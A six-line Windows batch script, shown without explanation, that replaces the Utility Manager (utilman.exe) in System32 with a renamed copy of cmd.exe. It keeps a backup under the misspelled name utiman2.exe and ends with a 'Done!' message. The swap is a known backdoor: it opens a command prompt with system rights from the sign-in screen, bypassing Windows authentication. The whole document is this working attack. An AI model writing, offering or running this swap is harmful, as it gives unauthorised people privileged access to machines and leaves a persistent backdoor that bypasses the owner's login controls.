C:
 cd C:\Windows\System32
 copy utilman.exe utiman2.exe
 del utilman.exe
 copy cmd.exe cmd2.exe
 ren cmd2.exe utilman.exe
 msg %username% Done!